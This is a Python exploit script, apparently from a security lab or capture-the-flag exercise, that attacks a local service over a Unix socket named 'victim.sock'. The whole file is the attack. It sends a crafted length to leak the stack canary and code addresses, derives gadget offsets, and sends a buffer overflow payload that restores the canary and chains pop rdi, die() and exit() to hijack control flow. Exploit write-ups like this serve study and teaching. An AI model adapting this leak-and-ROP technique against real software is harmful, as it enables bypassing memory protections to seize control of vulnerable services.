import os
import socket
import struct
import sys

#create a socket to read from file handler
sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)

#send string and length to server
strg = b'A' * 16 + b'\n648\n'
s.send(strg)
data = s.recv(1024)

b_canary = []
canary = []
ret_addr = []
b_bin_addr = []
bin_addr = []
#valuebyte = ''

for i in range(len(data)):
	this_byte = hex(ord(data[i]))
	if len(this_byte) == 3:
		this_byte = '0x0' + this_byte[2]
	#valuebyte += this_byte + '\t'
	if i>23 and i<32:
		canary.append(this_byte)
		b_canary.append(ord(data[i]))
	if i>639 and i<648:
		ret_addr.append(this_byte)
	if i>271 and i<280:
		bin_addr.append(this_byte)
		b_bin_addr.append(ord(data[i]))
	#if (i+1)%8 == 0:
		#print(valuebyte)
		#valuebyte = ''

canary.reverse()
canary_str = ''
for c in range(8):
	canary_str += canary[c]

ret_addr.reverse()
ret_addr_str = ''
for r in range(8):
	ret_addr_str += ret_addr[r]

bin_addr.reverse()
bin_addr_str = ''
for b in range(8):
	bin_addr_str += bin_addr[b]

write_to_file = '0x' + canary_str.replace('0x','') + '\n0x' + ret_addr_str.replace('0x','') + '\n0x' + bin_addr_str.replace('0x','') + '\n'

filename = 'leaked_data.txt'
with open(filename, 'w') as file_object:
    file_object.write(write_to_file)

# add offset to base address and conver to little endian

b_num = bin_addr_str.replace('0x','').encode()
b_die = bin_addr_str.replace('0x','').encode()
b_pwn = ret_addr_str.replace('0x','').encode()

# for pop rdi; ret
b_num = hex(int(b_num,16) + int('0xf33',16))

# for die()
b_die = hex(int(b_die,16) + int('0xaea',16))

# for string
b_pwn = hex(int(b_pwn,16) - int('0x3a0',16))

bnum2 = ''
bdie2 = ''
bpwn2 = ''

if len(b_num) < 18:
	for i in range(18-len(b_num)):
		bnum2+='0'
bnum2+=b_num.replace('0x','')

if len(b_die) < 18:
        for i in range(18-len(b_die)):
                bdie2+='0'
bdie2+=b_die.replace('0x','')

if len(b_pwn) < 18:
        for i in range(18-len(b_pwn)):
                bpwn2+='0'
bpwn2+=b_pwn.replace('0x','')

bin_addr = []
this_byte = ''
for i in range(16):
	this_byte += bnum2[i]
	if (i+1)%2 == 0:
		bin_addr.append(int(this_byte,16))
		this_byte=''
bin_addr.reverse()
b_address = []
for i in range(8):
	b_address.append(bin_addr[i])

die_addr = []
this_byte = ''
for i in range(16):
        this_byte += bdie2[i]
        if (i+1)%2 == 0:
                die_addr.append(int(this_byte,16))
                this_byte=''
die_addr.reverse()
d_address = []
for i in range(8):
        d_address.append(die_addr[i])

pwn_addr = []
this_byte = ''
for i in range(16):
        this_byte += bpwn2[i]
        if (i+1)%2 == 0:
                pwn_addr.append(int(this_byte,16))
                this_byte=''
pwn_addr.reverse()
pwn_address = []
for i in range(8):
        pwn_address.append(pwn_addr[i])

strg = b'pawned!\0' # pawned!
strg+= b'AAAAAAAA'  # AAAAAAAA
strg+= b'BBBBBBBB'  # BBBBBBBB
for c in range(8):
        strg += struct.pack('B',b_canary[c]) # canary
strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
for c in range(8):
        strg += struct.pack('B',b_address[c]) # pop rdi; ret
for c in range(8):
        strg += struct.pack('B',pwn_address[c]) # string - pawned!
for c in range(8):
        strg += struct.pack('B',d_address[c]) # die()
strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()

#send string and length to server
strg += b'\n88\n'
s.send(strg)
data = s.recv(1024)
s.close()
